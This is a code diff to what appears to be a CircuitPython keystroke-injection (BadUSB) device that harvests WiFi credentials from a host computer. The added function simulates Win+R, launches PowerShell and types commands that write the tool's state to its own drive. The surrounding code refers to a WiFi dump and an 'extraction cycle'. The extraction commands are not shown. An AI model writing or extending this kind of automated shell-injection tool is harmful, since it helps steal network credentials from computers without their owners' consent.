@@ -108,6 +108,22 @@ def sanitize_for_hid(text):
             safe.append("?")  # replace anything exotic
     return "".join(safe)
 
+def persist_state_ps(new_state):
+    keyboard.press(Keycode.WINDOWS, Keycode.R)
+    keyboard.release_all()
+    time.sleep(1)
+
+    layout.write("powershell\n")
+    time.sleep(3)
+
+    layout.write(
+        '$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter\n'
+        '$state = Join-Path "${cp}:" "state.txt"\n'
+        f'Set-Content -Encoding ASCII $state "{new_state}"\n'
+        'exit\n'
+    )
+    time.sleep(3)
+
 # Notepad method to display output
 def output_phase():
     global state
@@ -117,10 +133,15 @@ def output_phase():
     wifi_data = read_wifi_dump()
 
     if not wifi_data.strip():
-        print("No WiFi data found.")
+        print("No WiFi credentials   found.")
+        
         state = IDLE
+
+        # Save state in persistent storage
+        persist_state_ps("IDLE")
+
         led_color(255, 0, 0)  # Red
-        print("Output created. Ready for new extraction cycle.")
+        print("State reset to IDLE. Ready for new extraction cycle.")
         return
 
     # Normalize line endings (CRITICAL)
